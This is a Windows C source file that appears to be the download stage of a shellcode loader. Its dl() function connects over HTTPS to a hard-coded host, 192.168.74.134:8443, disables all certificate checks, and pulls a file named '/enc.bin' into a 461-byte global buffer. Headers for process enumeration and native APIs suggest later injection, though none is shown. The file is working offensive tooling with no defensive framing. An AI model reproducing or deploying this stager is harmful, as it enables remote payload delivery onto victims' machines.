#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include "Winternl.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ntdll")

unsigned char buf[461];

void dl(const wchar_t *host, short port)
{
	int counter = 0;

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, (LPCWSTR)host, port, 0);

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/enc.bin", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

	// This is for accepting self signed Cert
	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
	{
		exit(443);
	}

	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);

	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];

			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			// Read the Data.

			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				int i = 0;
				while (i < dwSize)
				{
					// Since the cunks are transferred in 8192 bytes, this check is required for larger buffers
					if (counter >= sizeof(buf))
					{
						break;
					}
					memcpy(&buf[counter], &pszOutBuffer[i], sizeof(char));

					//printf("i:%d | dwSize:%d | Counter:%d | buf char:%c | psz char: %c\n", i, dwSize, counter, buf[counter], pszOutBuffer[i]);
					counter++;
					i++;
				}
			}
			// Free the memory allocated to the buffer.
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}

	printf("[+] %d Bytes successfully written!\n", sizeof(buf));

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}



int main(int argc, char* argv[])
{
	dl(L"192.168.74.134", (short)8443);
	return 0;
}
